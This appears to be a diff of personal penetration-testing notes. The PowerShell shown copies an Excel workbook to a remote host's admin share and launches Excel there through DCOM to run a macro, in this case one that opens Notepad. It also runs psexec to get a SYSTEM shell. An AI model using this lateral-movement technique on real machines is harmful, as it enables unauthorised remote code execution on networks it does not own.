@@ -2337,13 +2337,22 @@ $RemotePath = "\\$rHost\c$\conf.xls"
   # access the remote file system through smb
 [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
 
+  # create the system profile for the SYSTEM user to launch the EXCEL.
+mkdir C:\Windows\System32\config\systemprofile\Desktop
+mkdir C:\Windows\SysWOW64\config\systemprofile\Desktop
+
 $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", $rHost)) 
 $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("openNotePad")
   # open the file on remote computer
+    #+end_src 
 
-    #+end_src
-
-    
+   #begin_src powershell
+     # about the system profile. 
+   psexec -s \\localhost cmd
+   cd %appdata%
+     # C:\Windows\System32\config\systemprofile\AppData\Roaming>
+   #+end_src
 
 * TODO list
   + nmap: quick, full
